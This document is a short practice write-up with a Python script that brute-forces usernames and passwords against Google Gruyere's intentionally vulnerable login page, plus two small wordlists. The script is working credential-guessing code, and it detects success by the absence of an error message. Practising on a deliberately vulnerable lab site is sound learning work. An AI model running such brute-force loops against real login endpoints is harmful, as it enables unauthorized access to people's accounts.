Bruteforcing against Google's demo security website (made for playing with web exploits): https://google-gruyere.appspot.com/444282917090618779012986592491275729151/login

#Sending usernames/passwords is infrequent in get requests, it's generally via post since credentials can be seen in plaintext in get - this site is get since it's intentionally vulnerable

import requests
import re

url = "https://google-gruyere.appspot.com/444282917090618779012986592491275729151/login"

data_dict = {"uid": 0, "pw": 0, "Login": "submit"}
pattern = r"(<div class='message'>)(.*?)(</div)"
usernames = []
passwords = []

with open("username_list.txt", "r") as username_list:
  for username in username_list.readlines():
    with open("password_list.txt", "r") as password_list:
      for password in password_list.readlines():
        username = username.strip()
        password = password.strip()
        data_dict["uid"] = username
        data_dict["pw"] = password
        response = requests.get(url, params=data_dict)
        match = re.search(pattern, response.text)
        if not match:
          print("Found valid username and password")
          usernames.append(username)
          passwords.append(password)  

for i in range(len(usernames)):
  print("username: " + usernames[i] + " -> " + "password: " + passwords[i])


username_list.txt (stored in different file on desktop)
suma
abcd
efghsiu
jklmnop
abc123
guest
admin
local

password_list.txt (stored in different file on desktop)
password
pw
pass123
123456
password1
guest
admin
